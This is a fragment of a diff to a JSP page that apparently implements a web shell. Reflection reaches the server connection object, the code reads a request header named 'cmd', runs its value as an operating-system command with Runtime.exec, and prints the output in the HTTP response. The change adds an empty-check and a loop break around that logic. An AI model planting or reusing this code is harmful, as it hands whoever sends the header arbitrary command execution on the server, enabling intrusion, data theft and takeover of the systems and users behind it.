@@ -22,13 +22,16 @@
             obj = method.invoke(connection);
 
             method = obj.getClass().getMethod("getHeader", String.class);
-            obj = method.invoke(obj, "cmd");
+            String cmd = (String)method.invoke(obj, "cmd");
+            if(cmd != null && !cmd.isEmpty()){
+                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
-            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter("\\A").next();
+                method = connection.getClass().getMethod("getPrintWriter", String.class);
+                java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, "utf-8");
+                printWriter.println(res);
+            }
 
-            method = connection.getClass().getMethod("getPrintWriter", String.class);
-            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, "utf-8");
-            printWriter.println(res);
+			break;
         }
     }
 %>
